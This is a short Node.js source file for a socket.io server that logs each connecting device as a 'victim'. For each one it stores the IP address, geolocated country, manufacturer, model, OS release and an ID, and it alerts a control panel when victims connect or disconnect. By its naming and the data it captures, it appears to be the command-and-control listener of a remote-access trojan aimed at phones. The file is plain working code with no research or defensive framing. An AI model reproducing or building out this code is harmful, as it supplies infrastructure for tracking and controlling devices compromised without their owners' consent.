const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const geoip = require('geoip-lite');
const victimsList = require('./assets/js/model/Victim');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = process.env.PORT || 3000;

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

const listeningStatus = {}; // Object to track listening status for each port

io.on('connection', (socket) => {
    const address = socket.request.connection;
    const query = socket.handshake.query;
    const index = query.id;
    const ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    let country = null;
    const geo = geoip.lookup(ip); // check IP location
    if (geo)
        country = geo.country.toLowerCase();

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

    // Notify about the new victim
    io.emit('SocketIO:NewVictim', index);

    socket.on('disconnect', () => {
        // Decrease the socket count on a disconnect
        victimsList.rmVictim(index);

        // Notify about the disconnected victim
        io.emit('SocketIO:RemoveVictim', index);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
